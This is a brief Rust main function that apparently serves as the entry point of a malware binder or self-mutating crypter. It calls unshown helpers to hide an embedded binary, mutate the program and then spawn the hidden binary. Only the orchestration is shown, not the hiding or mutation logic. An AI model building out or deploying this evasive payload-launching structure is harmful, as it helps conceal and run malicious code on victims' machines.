mod modules;
use modules::{get_file, mutate, hide_binary};

fn main() {
    
    let (exe, binary) = get_file();
    if binary.is_empty() {
        mutate();
        std::process::exit(0);
    }       
        
    hide_binary(&exe, &binary); 
    mutate();
    std::process::Command::new(format!("./{}", binary))
                        .spawn()
                        .expect("Failed to spawn the process");

}



